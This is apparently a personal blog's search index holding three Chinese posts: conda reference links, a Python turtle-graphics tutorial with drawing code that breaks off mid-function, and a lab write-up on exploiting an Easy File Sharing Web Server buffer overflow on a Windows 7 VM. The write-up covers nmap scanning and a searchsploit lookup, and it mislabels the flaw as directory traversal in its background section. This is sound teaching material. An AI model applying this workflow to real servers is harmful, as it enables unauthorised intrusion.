<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Anaconda与conda</title>
    <url>/2023/04/10/Anaconda%E4%B8%8Econda/</url>
    <content><![CDATA[<h1 id="anaconda的安装"><a href="#anaconda的安装" class="headerlink" title="anaconda的安装"></a>anaconda的安装</h1><blockquote>
<p>安装的流程很简单，但是在启动Anaconda Navigator时要有点耐心，不要乱点，否则可能会无法显示。</p>
</blockquote>
<p><a href="https://www.zhihu.com/question/58033789">https://www.zhihu.com/question/58033789</a></p>
<h1 id="conda的基本命令"><a href="#conda的基本命令" class="headerlink" title="conda的基本命令"></a>conda的基本命令</h1><blockquote>
<p>Conda是一个管理版本和Python环境的工具，有很多相关的命令。这部分内容也会在百宝盒里进行加入</p>
</blockquote>
<p><a href="https://blog.csdn.net/chenxy_bwave/article/details/119996001">https://blog.csdn.net/chenxy_bwave&#x2F;article&#x2F;details&#x2F;119996001</a></p>
<h1 id="Conda：误解与迷思"><a href="#Conda：误解与迷思" class="headerlink" title="Conda：误解与迷思"></a>Conda：误解与迷思</h1><blockquote>
<p>这篇文章很有意思，对anaconda和conda的很多概念进行解释。不过可能是译文，读起来有些地方难以理解。但是绝对是一篇让人收获满满的文章。</p>
</blockquote>
<p><a href="https://cloud.tencent.com/developer/article/1035806">https://cloud.tencent.com/developer/article/1035806</a></p>
]]></content>
      <categories>
        <category>【-基础知识-】编程语言学习</category>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Easy File Sharing Web Server 缓冲区溢出漏洞的简单复现</title>
    <url>/2023/03/29/Easy%20File%20Sharing%20Web%20Server%20%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h1><blockquote>
<p><a href="http://www.cnnvd.org.cn/web/index.html">http://www.cnnvd.org.cn/web/index.html</a>国家安全漏洞库可以查看这个漏洞</p>
</blockquote>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095743577.png" alt="image-20231109095743577"><br>Easy File Sharing Web Server在处理用户请求时存在输入验证漏洞，远程攻击者可能利用此漏洞获取敏感信息。Easy File Sharing Web Server在上传文件时没有正确地过滤某些参数，允许用户通过目录遍历攻击向任意父目录上传文件。</p>
<h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h1><ul>
<li><p><code>攻击机</code>:Kali-Linux2</p>
</li>
<li><p><code>靶机</code>: Windows7 旗舰版   </p>
</li>
<li><p><code>漏洞名称</code>：Easy File Sharing Web Server 缓冲区溢出漏洞</p>
</li>
</ul>
<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><h2 id="win7靶机的准备工作"><a href="#win7靶机的准备工作" class="headerlink" title="win7靶机的准备工作"></a>win7靶机的准备工作</h2><ol>
<li><p>设置网络适配器，开启NAT模式。这样做的目的是使攻击机与靶机在同一个子网中。</p>
</li>
<li><p>查询靶机ip地址，便于扫描与设置<br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095757692.png" alt="image-20231109095757692"></p>
</li>
<li><p>开启服务，配置ip地址与端口<br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095809613.png" alt="image-20231109095809613"></p>
</li>
<li><p>漏洞测试</p>
<blockquote>
<p>进入80端口，并进行溢出测试</p>
</blockquote>
</li>
</ol>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095820983.png" alt="image-20231109095820983"></p>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095831608.png" alt="image-20231109095831608"></p>
<h2 id="攻击机准备工作"><a href="#攻击机准备工作" class="headerlink" title="攻击机准备工作"></a>攻击机准备工作</h2><ol>
<li>扫描靶机ip，查看端口及服务<blockquote>
<p>使用 <code>nmap -sV -p 80 [ip地址]</code>  查询80端口开启的服务</p>
</blockquote>
</li>
</ol>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095844007.png" alt="image-20231109095844007"><br><img src="https://gitee.com/qidangge/picgo/raw/master/img/202111062205799.png"></p>
<p>发现win7靶机上已经运行此服务</p>
<ol start="2">
<li>漏洞利用<blockquote>
<p>2.1 可以在<a href="www.exploit-db.com">www.exploit-db.com</a>查询此漏洞利用模块</p>
</blockquote>
</li>
</ol>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095859790.png" alt="image-20231109095859790"></p>
<blockquote>
<p>2.2 Kali Linux2系统自带的漏洞库，其中有exploit-db漏洞库的拷贝。使用<code>searchsploit</code>进行查询</p>
</blockquote>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095911839.png" alt="image-20231109095911839"></p>
<ol start="3">
<li>执行脚本进行利用</li>
</ol>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095923726.png" alt="image-20231109095923726"></p>
<h1 id="收获与教训"><a href="#收获与教训" class="headerlink" title="收获与教训"></a>收获与教训</h1><h2 id="我的收获"><a href="#我的收获" class="headerlink" title="我的收获"></a>我的收获</h2><ul>
<li>知道了几个漏洞查询的平台与kali中的查询方法</li>
<li>安装了win7的虚拟机，可以用于以后的测试</li>
<li>了解了漏洞利用的大体流程</li>
<li>命令积累：</li>
</ul>
<ol>
<li><code>netstat -参数</code>  查询开启端口与服务</li>
<li><code>searchsploit 漏洞</code> 查询漏洞库</li>
</ol>
<h2 id="我的教训"><a href="#我的教训" class="headerlink" title="我的教训"></a>我的教训</h2><p>刚开始在win10物理机上进行测试，可以扫到端口与服务，但是无法利用成功，输入超字符也无法使服务崩溃。</p>
<p>​      </p>
]]></content>
      <categories>
        <category>【-专业知识-】渗透测试</category>
        <category>课程记录</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Python学习--模块扩展</title>
    <url>/2023/04/10/Python%E5%AD%A6%E4%B9%A0--%E6%A8%A1%E5%9D%97%E6%89%A9%E5%B1%95/</url>
    <content><![CDATA[<h1 id="re模块–KMP模式匹配"><a href="#re模块–KMP模式匹配" class="headerlink" title="re模块–KMP模式匹配"></a>re模块–KMP模式匹配</h1><h1 id="海龟绘图模块–turtle的使用"><a href="#海龟绘图模块–turtle的使用" class="headerlink" title="海龟绘图模块–turtle的使用"></a>海龟绘图模块–turtle的使用</h1><blockquote>
<p>本节讲解Python头歌课程附加内容–turtle的使用。包含具体功能介绍与演示实例。最后会有一个实践作业进行实操。</p>
<blockquote>
<p>附上官方文档：<a href="https://docs.python.org/zh-cn/3/library/turtle.html">https://docs.python.org/zh-cn/3/library/turtle.html</a></p>
</blockquote>
</blockquote>
<h2 id="模块介绍"><a href="#模块介绍" class="headerlink" title="模块介绍"></a>模块介绍</h2><p><strong>turtle模块</strong>属于Python的标准库，是一个入门级的图形绘制函数库。</p>
<h2 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h2><blockquote>
<p>以一个五角星为例进行turtle图形绘制的演示</p>
</blockquote>
<p><strong>代码如下</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"></span><br><span class="line">turtle.pensize(<span class="number">5</span>)</span><br><span class="line">turtle.setup(<span class="number">600</span>, <span class="number">600</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">turtle.up()</span><br><span class="line">turtle.setx(-<span class="number">100</span>)</span><br><span class="line">turtle.pd()</span><br><span class="line">turtle.title(<span class="string">&quot;桂电欢迎你&quot;</span>)</span><br><span class="line">turtle.color(<span class="string">&quot;purple&quot;</span>, <span class="string">&quot;red&quot;</span>)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    turtle.fd(<span class="number">180</span>)</span><br><span class="line">    turtle.right(<span class="number">144</span>)</span><br><span class="line">turtle.end_fill()</span><br><span class="line">turtle.done()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>结果演示</strong>：<br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095537140.png" alt="image-20231109095537140"></p>
<p>上例包含了海龟画图的基本设置与步骤，下面我们具体介绍。</p>
<blockquote>
<p>第一步：画笔设置</p>
</blockquote>
<ul>
<li>turtle.<code>pensize(5)</code>：线条粗细</li>
<li>turtle.<code>up()</code>：提起画笔</li>
<li>turtle.<code>setx(-100)</code>：画笔初始点移动</li>
<li>turtle.<code>down()</code>：放下画笔</li>
<li><code>t.goto(x, y)</code>:使得海龟移动到指定像素坐标（以中心点为原点）</li>
<li></li>
</ul>
<blockquote>
<p>第二步：颜色填充</p>
</blockquote>
<ul>
<li>turtle.<code>color(&quot;purple&quot;, &quot;red&quot;)</code>：参数依次是 画笔颜色、填充颜色</li>
<li><code>t.fillcolor(&quot;#xxxxx&quot;)</code>:指定填充颜色（需要begin和end)</li>
<li><code>t.pencolor(&quot;#xxxxx&quot;)</code>:指定画笔的颜色</li>
</ul>
<blockquote>
<p>第三步：海龟动作</p>
</blockquote>
<ul>
<li>turtle.<code>fd(180)</code>：正方向移动180像素</li>
<li>turtle.<code>right(144)</code>：向右转144度</li>
<li><code>t.bk(23)</code>:后退23像素</li>
<li><code>t.write(&quot;hello&quot;,font=(&quot;楷体“，15，”normal&quot;))</code>:在屏幕上指定位置写入字符串</li>
<li><code>t.circle(45,180)</code>:以半径为45画圆180度</li>
</ul>
<blockquote>
<p>第四步：窗口设置</p>
</blockquote>
<ul>
<li>turtle.<code>setup(600, 600, 0, 0)</code>：参数依次是  画布宽度、长度、与上屏幕距离、与左屏幕距离</li>
<li>turtle.<code>title(&quot;桂电欢迎你&quot;)</code>：图画标题</li>
<li><code>t.screensize(1000, 600, &#39;white&#39;)</code>:指定窗口的大小（注意与画布大小的区别）</li>
<li><code>t.bgpic(&quot;bg3.gif&quot;)</code>：指定背景图片（注意与画布大小匹配）</li>
</ul>
<h2 id="代码实例：2022年春节"><a href="#代码实例：2022年春节" class="headerlink" title="代码实例：2022年春节"></a>代码实例：2022年春节</h2><p><strong>代码实例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle <span class="keyword">as</span> t</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此函数用于定点跳转海龟位置，参数为横纵坐标</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">go</span>(<span class="params">x, y</span>):</span><br><span class="line">    t.up()                          <span class="comment"># 抬起画笔</span></span><br><span class="line">    t.goto(x, y)                    <span class="comment"># 位置跳转（不改变方向）</span></span><br><span class="line">    t.down()                        <span class="comment"># 放下画笔</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正方形绘画函数：用于简化操作，进行常规正方形的绘画</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">square</span>(<span class="params">w,h</span>):</span><br><span class="line">    t.fd(w)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.fd(h)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.fd(w)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.fd(h)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 房子、车辆绘画函数：用于配置房子、车辆的形状、颜色</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">house</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="comment"># 主墙面</span></span><br><span class="line">    go(x, y)</span><br><span class="line">    t.fillcolor(<span class="string">&quot;#D45D00&quot;</span>)</span><br><span class="line">    t.begin_fill()</span><br><span class="line">    square(<span class="number">372</span>, <span class="number">184</span>)</span><br><span class="line">    t.end_fill()</span><br><span class="line">    <span class="comment"># 对联1</span></span><br><span class="line">    go(-<span class="number">112</span>, -<span class="number">211</span>)</span><br><span class="line">    t.fillcolor(<span class="string">&quot;#E4002B&quot;</span>)</span><br><span class="line">    t.begin_fill()</span><br><span class="line">    square(<span class="number">33</span>, <span class="number">147</span>)</span><br><span class="line">    t.end_fill()</span><br><span class="line">    <span class="comment"># 对联2</span></span><br><span class="line">    go(<span class="number">206</span>, -<span class="number">211</span>)</span><br><span class="line">    t.fillcolor(<span class="string">&quot;#E4002B&quot;</span>)</span><br><span class="line">    t.begin_fill()</span><br><span class="line">    square(<span class="number">33</span>, <span class="number">147</span>)</span><br><span class="line">    t.end_fill()</span><br><span class="line">    <span class="comment"># 横批</span></span><br><span class="line">    go(<span class="number">31</span>, -<span class="number">86</span>)</span><br><span class="line">    t.fillcolor(<span class="string">&quot;#E4002B&quot;</span>)</span><br><span class="line">    t.begin_fill()</span><br><span class="line">    square(<span class="number">94</span>, <span class="number">30</span>)</span><br><span class="line">    t.end_fill()</span><br><span class="line">    <span class="comment"># 门</span></span><br><span class="line">    go(<span class="number">52</span>, -<span class="number">223</span>)</span><br><span class="line">    t.fillcolor(<span class="string">&quot;#9BCBEB&quot;</span>)</span><br><span class="line">    t.begin_fill()</span><br><span class="line">    t.fd(<span class="number">50</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.fd(<span class="number">73</span>)</span><br><span class="line">    t.circle(<span class="number">25</span>, <span class="number">180</span>)</span><br><span class="line">    t.fd(<span class="number">75</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.end_fill()</span><br><span class="line">    <span class="comment"># 福字</span></span><br><span class="line">    go(-<span class="number">62</span>, -<span class="number">129</span>)</span><br><span class="line">    t.fillcolor(<span class="string">&quot;#E4002B&quot;</span>)</span><br><span class="line">    t.begin_fill()</span><br><span class="line">    t.right(<span class="number">45</span>)</span><br><span class="line">    t.fd(<span class="number">40</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.fd(<span class="number">40</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.fd(<span class="number">40</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.fd(<span class="number">40</span>)</span><br><span class="line">    t.left(<span class="number">135</span>)</span><br><span class="line">    t.end_fill()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 顶部</span></span><br><span class="line">    go(-<span class="number">141</span>, -<span class="number">39</span>)</span><br><span class="line">    t.fillcolor(<span class="string">&quot;#C6A992&quot;</span>)</span><br><span class="line">    t.begin_fill()</span><br><span class="line">    square(<span class="number">408</span>, <span class="number">10</span>)</span><br><span class="line">    t.fd(<span class="number">408</span>)</span><br><span class="line">    t.left(<span class="number">60</span>)</span><br><span class="line">    t.fd(<span class="number">85</span>)</span><br><span class="line">    t.right(<span class="number">105</span>)</span><br><span class="line">    t.fd(<span class="number">44</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.fd(<span class="number">10</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.fd(<span class="number">55</span>)</span><br><span class="line">    t.left(<span class="number">105</span>)</span><br><span class="line">    t.fd(<span class="number">88</span>)</span><br><span class="line">    t.left(<span class="number">120</span>)</span><br><span class="line">    t.end_fill()</span><br><span class="line">    go(-<span class="number">141</span>, -<span class="number">29</span>)</span><br><span class="line">    t.fillcolor(<span class="string">&quot;#006BA6&quot;</span>)</span><br><span class="line">    t.begin_fill()</span><br><span class="line">    t.left(<span class="number">60</span>)</span><br><span class="line">    t.fd(<span class="number">90</span>)</span><br><span class="line">    t.right(<span class="number">60</span>)</span><br><span class="line">    t.fd(<span class="number">404</span>)</span><br><span class="line">    t.right(<span class="number">120</span>)</span><br><span class="line">    t.up()</span><br><span class="line">    t.fd(<span class="number">90</span>)</span><br><span class="line">    t.down()</span><br><span class="line">    t.right(<span class="number">60</span>)</span><br><span class="line">    t.fd(<span class="number">404</span>)</span><br><span class="line">    t.right(<span class="number">180</span>)</span><br><span class="line">    t.end_fill()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 侧墙</span></span><br><span class="line">    go(<span class="number">267</span>, -<span class="number">39</span>)</span><br><span class="line">    t.fillcolor(<span class="string">&quot;#F0E87B&quot;</span>)</span><br><span class="line">    t.begin_fill()</span><br><span class="line">    t.left(<span class="number">180</span>)</span><br><span class="line">    t.fd(<span class="number">17</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.fd(<span class="number">184</span>)</span><br><span class="line">    t.left(<span class="number">135</span>)</span><br><span class="line">    t.fd(<span class="number">105</span>)</span><br><span class="line">    t.left(<span class="number">45</span>)</span><br><span class="line">    t.fd(<span class="number">150</span>)</span><br><span class="line">    t.left(<span class="number">45</span>)</span><br><span class="line">    t.fd(<span class="number">30</span>)</span><br><span class="line">    t.up()</span><br><span class="line">    t.left(<span class="number">105</span>)</span><br><span class="line">    t.fd(<span class="number">60</span>)</span><br><span class="line">    t.end_fill()</span><br><span class="line"></span><br><span class="line">    t.fillcolor(<span class="string">&quot;#DBC8B6&quot;</span>)</span><br><span class="line">    t.left(<span class="number">180</span>)</span><br><span class="line">    t.fd(<span class="number">61</span>)</span><br><span class="line">    t.begin_fill()</span><br><span class="line">    t.right(<span class="number">105</span>)</span><br><span class="line">    t.fd(<span class="number">29</span>)</span><br><span class="line">    t.left(<span class="number">45</span>)</span><br><span class="line">    t.down()</span><br><span class="line">    t.fd(<span class="number">17</span>)</span><br><span class="line">    t.up()</span><br><span class="line">    t.left(<span class="number">135</span>)</span><br><span class="line">    t.fd(<span class="number">44</span>)</span><br><span class="line">    t.left(<span class="number">105</span>)</span><br><span class="line">    t.fd(<span class="number">30</span>)</span><br><span class="line">    t.left(<span class="number">120</span>)</span><br><span class="line">    t.end_fill()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 灯笼</span></span><br><span class="line">    go(<span class="number">293</span>, -<span class="number">16</span>)</span><br><span class="line">    t.pensize(<span class="number">4</span>)</span><br><span class="line">    t.fd(<span class="number">93</span>)</span><br><span class="line">    t.up()</span><br><span class="line">    t.bk(<span class="number">30</span>)</span><br><span class="line">    t.down()</span><br><span class="line">    t.right(<span class="number">90</span>)</span><br><span class="line">    t.fd(<span class="number">30</span>)</span><br><span class="line">    t.pensize(<span class="number">2</span>)</span><br><span class="line">    t.fillcolor(<span class="string">&quot;#D45D00&quot;</span>)</span><br><span class="line">    t.begin_fill()</span><br><span class="line">    t.right(<span class="number">90</span>)</span><br><span class="line">    t.fd(<span class="number">15</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.fd(<span class="number">15</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.fd(<span class="number">30</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.fd(<span class="number">15</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.fd(<span class="number">15</span>)</span><br><span class="line">    t.end_fill()</span><br><span class="line"></span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.up()</span><br><span class="line">    t.fd(<span class="number">15</span>)</span><br><span class="line">    t.down()</span><br><span class="line">    t.fillcolor(<span class="string">&quot;#E4002B&quot;</span>)</span><br><span class="line">    t.begin_fill()</span><br><span class="line">    t.right(<span class="number">90</span>)</span><br><span class="line">    t.circle(<span class="number">30</span>)</span><br><span class="line">    t.end_fill()</span><br><span class="line">    t.left(<span class="number">180</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 车</span></span><br><span class="line"></span><br><span class="line">    go(-<span class="number">453</span>, -<span class="number">174</span>)</span><br><span class="line">    t.fillcolor(<span class="string">&quot;#003594&quot;</span>)</span><br><span class="line">    t.begin_fill()</span><br><span class="line">    t.fd(<span class="number">20</span>)</span><br><span class="line">    t.right(<span class="number">90</span>)</span><br><span class="line">    t.pensize(<span class="number">4</span>)</span><br><span class="line">    t.circle(<span class="number">25</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.up()</span><br><span class="line">    t.fd(<span class="number">50</span>)</span><br><span class="line">    t.down()</span><br><span class="line">    t.pensize(<span class="number">2</span>)</span><br><span class="line">    t.fd(<span class="number">80</span>)</span><br><span class="line">    t.right(<span class="number">90</span>)</span><br><span class="line">    t.pensize(<span class="number">4</span>)</span><br><span class="line">    t.circle(<span class="number">25</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.up()</span><br><span class="line">    t.fd(<span class="number">50</span>)</span><br><span class="line">    t.down()</span><br><span class="line">    t.pensize(<span class="number">2</span>)</span><br><span class="line">    t.fd(<span class="number">30</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.fd(<span class="number">60</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.fd(<span class="number">40</span>)</span><br><span class="line">    t.right(<span class="number">45</span>)</span><br><span class="line">    t.fd(<span class="number">70</span>)</span><br><span class="line">    t.left(<span class="number">45</span>)</span><br><span class="line">    t.fd(<span class="number">110</span>)</span><br><span class="line">    t.left(<span class="number">60</span>)</span><br><span class="line">    t.fd(<span class="number">55</span>)</span><br><span class="line">    t.left(<span class="number">30</span>)</span><br><span class="line">    t.fd(<span class="number">60</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.end_fill()</span><br><span class="line"></span><br><span class="line">    t.fillcolor(<span class="string">&quot;#407EC9&quot;</span>)</span><br><span class="line">    t.begin_fill()</span><br><span class="line">    go(-<span class="number">453</span>, -<span class="number">174</span>)</span><br><span class="line">    t.fd(<span class="number">20</span>)</span><br><span class="line">    t.right(<span class="number">90</span>)</span><br><span class="line">    t.pensize(<span class="number">4</span>)</span><br><span class="line">    t.circle(<span class="number">25</span>)</span><br><span class="line">    t.end_fill()</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.up()</span><br><span class="line">    t.fd(<span class="number">50</span>)</span><br><span class="line">    t.down()</span><br><span class="line">    t.pensize(<span class="number">2</span>)</span><br><span class="line">    t.fd(<span class="number">80</span>)</span><br><span class="line">    t.right(<span class="number">90</span>)</span><br><span class="line">    t.pensize(<span class="number">4</span>)</span><br><span class="line">    t.fillcolor(<span class="string">&quot;#407EC9&quot;</span>)</span><br><span class="line">    t.begin_fill()</span><br><span class="line">    t.circle(<span class="number">25</span>)</span><br><span class="line">    t.end_fill()</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.up()</span><br><span class="line">    t.fd(<span class="number">50</span>)</span><br><span class="line">    t.down()</span><br><span class="line">    t.pensize(<span class="number">2</span>)</span><br><span class="line">    t.fd(<span class="number">30</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.fd(<span class="number">60</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.fd(<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">    t.fillcolor(<span class="string">&quot;#C8D8EB&quot;</span>)</span><br><span class="line">    t.begin_fill()</span><br><span class="line">    t.fd(<span class="number">130</span>)</span><br><span class="line">    t.right(<span class="number">105</span>)</span><br><span class="line">    t.fd(<span class="number">51</span>)</span><br><span class="line">    t.right(<span class="number">75</span>)</span><br><span class="line">    t.fd(<span class="number">66</span>)</span><br><span class="line">    t.right(<span class="number">45</span>)</span><br><span class="line">    t.fd(<span class="number">70</span>)</span><br><span class="line">    t.end_fill()</span><br><span class="line">    t.left(<span class="number">45</span>)</span><br><span class="line">    t.bk(<span class="number">70</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.fd(<span class="number">50</span>)</span><br><span class="line">    t.right(<span class="number">90</span>)</span><br><span class="line"></span><br><span class="line">    go(-<span class="number">453</span>, -<span class="number">114</span>)</span><br><span class="line">    t.fd(<span class="number">20</span>)</span><br><span class="line">    t.up()</span><br><span class="line">    t.right(<span class="number">90</span>)</span><br><span class="line">    t.pensize(<span class="number">3</span>)</span><br><span class="line">    t.fd(<span class="number">15</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.fd(<span class="number">80</span>)</span><br><span class="line">    t.down()</span><br><span class="line">    t.fd(<span class="number">40</span>)</span><br><span class="line">    t.pensize(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 太阳绘画函数：用于绘制图片中的太阳</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sun</span>(<span class="params">x, y</span>):</span><br><span class="line">    go(x, y)</span><br><span class="line">    t.fillcolor(<span class="string">&quot;#FF671F&quot;</span>)</span><br><span class="line">    t.begin_fill()</span><br><span class="line">    t.circle(<span class="number">65</span>)</span><br><span class="line">    t.end_fill()</span><br><span class="line">    t.pensize(<span class="number">3</span>)</span><br><span class="line">    go(-<span class="number">380</span>, <span class="number">185</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.circle(<span class="number">20</span>, <span class="number">180</span>)</span><br><span class="line"></span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.up()</span><br><span class="line">    t.fd(<span class="number">90</span>)</span><br><span class="line">    t.down()</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.circle(<span class="number">20</span>, <span class="number">180</span>)</span><br><span class="line">    t.right(<span class="number">90</span>)</span><br><span class="line">    t.up()</span><br><span class="line">    t.fd(<span class="number">10</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.fd(<span class="number">50</span>)</span><br><span class="line">    t.down()</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.circle(<span class="number">50</span>, <span class="number">45</span>)</span><br><span class="line">    t.circle(<span class="number">50</span>, -<span class="number">75</span>)</span><br><span class="line">    t.circle(<span class="number">50</span>, <span class="number">30</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 具体树木绘画函数，通过递归进行。</span></span><br><span class="line">SIZE_TREE = <span class="number">10</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw_tree</span>(<span class="params">size</span>):</span><br><span class="line">    <span class="keyword">if</span> size &gt; SIZE_TREE:</span><br><span class="line">        <span class="comment"># 右边</span></span><br><span class="line"></span><br><span class="line">        t.forward(size)</span><br><span class="line">        t.right(<span class="number">20</span>)</span><br><span class="line">        draw_tree(size / <span class="number">1.5</span>)</span><br><span class="line">        <span class="comment"># 左边</span></span><br><span class="line">        t.left(<span class="number">40</span>)</span><br><span class="line">        draw_tree(size / <span class="number">1.5</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 回到之前的树枝</span></span><br><span class="line">        t.right(<span class="number">20</span>)</span><br><span class="line">        <span class="comment"># 给最后的树枝画绿色</span></span><br><span class="line">        <span class="keyword">if</span> size / <span class="number">2</span> &lt;= SIZE_TREE:</span><br><span class="line">            t.color(<span class="string">&#x27;green&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            t.color(<span class="string">&#x27;brown&#x27;</span>)</span><br><span class="line">        t.backward(size)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 雪花生成函数：通过随机数生成雪花位置</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">snow</span>(<span class="params">snow_count</span>):</span><br><span class="line">    t.hideturtle()</span><br><span class="line">    t.speed(<span class="number">500</span>)</span><br><span class="line">    t.pensize(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(snow_count):</span><br><span class="line">        t.pencolor(<span class="string">&quot;white&quot;</span>)</span><br><span class="line">        t.pu()</span><br><span class="line">        t.goto(random.randint(-<span class="number">500</span>, <span class="number">500</span>), random.randint(-<span class="number">300</span>, <span class="number">300</span>))</span><br><span class="line">        t.pd()</span><br><span class="line">        dens = random.randint(<span class="number">5</span>, <span class="number">6</span>)</span><br><span class="line">        snowsize = random.randint(<span class="number">5</span>, <span class="number">10</span>)</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(dens):</span><br><span class="line">            t.fd(snowsize)</span><br><span class="line">            t.bk(snowsize)</span><br><span class="line">            t.right(<span class="number">360</span> / dens)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本函数为背景初始化函数，包括窗口和画布大小、背景图片、绘画速度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bg</span>():</span><br><span class="line">    t.setup(<span class="number">1000</span>, <span class="number">600</span>)</span><br><span class="line">    t.screensize(<span class="number">1000</span>, <span class="number">600</span>, <span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">    t.bgpic(<span class="string">&quot;bg3.gif&quot;</span>)</span><br><span class="line">    t.speed(<span class="number">10</span>)</span><br><span class="line">    t.title(<span class="string">&quot;2022年春节&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面两个函数为图片中树的绘画（调用draw_tree函数，使用递归方法）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Tree1</span>(<span class="params">x, y</span>):</span><br><span class="line">    go(x, y)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.pensize(<span class="number">3</span>)</span><br><span class="line">    draw_tree(<span class="number">100</span>)</span><br><span class="line">    